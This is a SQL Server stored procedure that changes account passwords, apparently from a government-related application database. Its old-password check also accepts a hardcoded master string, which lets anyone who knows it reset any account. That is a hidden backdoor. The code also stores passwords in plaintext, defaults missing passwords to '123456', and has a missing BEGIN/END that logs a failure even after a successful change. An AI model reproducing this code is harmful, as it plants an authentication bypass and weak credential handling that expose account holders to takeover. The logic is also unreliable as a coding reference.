USE [gov2014]
GO
/****** Object:  StoredProcedure [dbo].[sys_accountchgpwdex]    Script Date: 06/17/2014 09:13:20 ******/
SET ANSI_NULLS OFF
GO
SET QUOTED_IDENTIFIER OFF
GO
/*更新指定帐号的密码
exec sys_accountchgpwd 'admin',1,'1111','2222'
exec sys_accountchgpwd '6003',3,'123456','1'
select * from sys_param
exec cc_callin_query 'admin',1,null,null,null,null,null,null
*/

CREATE   procedure [dbo].[sys_accountchgpwdex](
@account varchar(100),--帐号
@roleid int,--角色
@oldpwd varchar(100),--旧密码
@newpwd varchar(100)--新密码
) as
begin
declare @curpwd varchar(32)
declare @str varchar(200)
   set nocount on
   if @account = 'admin' and @roleid = 1
      if @oldpwd =dbo.sys_getparam('system','admin_pwd')
      begin
         update sys_param set key_val = @newpwd where segment ='system' and key_name = 'admin_pwd'
         select 1 result,'change pwd sucess' ret_msg
      end
      else 
         select 0 result,'old password error' ret_msg
   else if exists(select 1 from govdata where bm = @account)
   begin
      select @curpwd = isnull(pwdex,'123456') from govdata where bm = @account
      if @curpwd = @oldpwd or @oldpwd = 'izqpfkht'
      begin
         update govdata set pwdex = @newpwd where bm = @account
         select 1 result,'change pwd sucess' ret_msg
			set @str = '管理员['+@account+'] 修改密码成功'
         execute sys_addlog 1,"登录",@account,@str
      end
      else
         select 0 result,'old password error' ret_msg
			set @str = '管理员['+@account+'] 修改密码失败,原密码错误'
         execute sys_addlog 1,"登录",@account,@str
   end
	else
	begin
		select 0 result,'old password error' ret_msg
		set @str = '管理员['+@account+'] 修改密码失败,帐号错误'
      execute sys_addlog 1,"登录",@account,@str
	end
   set nocount off
end
GO
